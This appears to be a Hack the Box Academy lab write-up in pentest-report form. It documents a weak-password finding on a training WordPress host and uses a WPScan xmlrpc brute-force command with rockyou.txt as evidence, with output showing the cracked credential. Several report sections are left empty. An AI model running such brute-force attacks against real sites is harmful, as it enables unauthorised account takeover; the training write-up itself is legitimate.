---
title: "Hack the Box"
subtitle: "Module: Attacking Common Applications"
author: "errbufferoverfl"
date: 2023-10-21T19:23:04+11:00
categories:
- Learning
- Hack the Box
- Hack the Box Academy
- Offensive
---

## Attack Chain 1: Compromising Wordpress

### Detailed Summary

- Host enumeration and discovery
- Wordpress discovery and enumeration

### Technical Reproduction Steps

### Findings

#### Weak Password Requirements

*The affected host does not require users to have strong passwords, making it easier for threat actors to compromise user accounts.*

**CWE:** CWE-521
**CVSS 3.1 Score:** 9.4 Critical (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L)
**Root Cause Analysis:** 
**Security Impact:** When successfully exploited, weak password requirements can result in a threat actor gaining long-term unauthorised access to the users account. Depending on the permissions associated with the compromised account, impact can vary.
**Affected Hosts:** blog.inlanefreight.local
**Remediation:**

#### Evidence

The following figure shows WPScan and the `rockyou.txt` password list against `blog.inlanefreight.local` to brute-force the password for the user account `doug`. `xmlrpc` is used as it is faster than HTTP-based password brute-forcing.

```
wpscan --url http://blog.inlanefreight.local --password-attack xmlrpc -t 20 -U doug -P ~/Sauce/SecLists/Passwords/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blog.inlanefreight.local/ [10.129.107.187]
[+] Started: Fri Oct 27 08:51:01 2023

...

[!] Valid Combinations Found:
 | Username: doug, Password: jessica1

...

[+] Finished: Fri Oct 27 08:51:40 2023
[+] Requests Done: 799
[+] Cached Requests: 41
[+] Data Sent: 393.439 KB
[+] Data Received: 448.799 KB
[+] Memory used: 284.395 MB
[+] Elapsed time: 00:00:38
```

## `blog.inlanefreight.local`

## Appendix A. Scope

-   app.inlanefreight.local
-   dev.inlanefreight.local
-   drupal-dev.inlanefreight.local
-   drupal-qa.inlanefreight.local
-   drupal-acc.inlanefreight.local
-   drupal.inlanefreight.local
-   blog-dev.inlanefreight.local
-   blog.inlanefreight.local
-   app-dev.inlanefreight.local
-   jenkins-dev.inlanefreight.local
-   jenkins.inlanefreight.local
-   web01.inlanefreight.local
-   gitlab-dev.inlanefreight.local
-   gitlab.inlanefreight.local
-   support-dev.inlanefreight.local
-   support.inlanefreight.local
-   inlanefreight.local
-   10.129.201.50

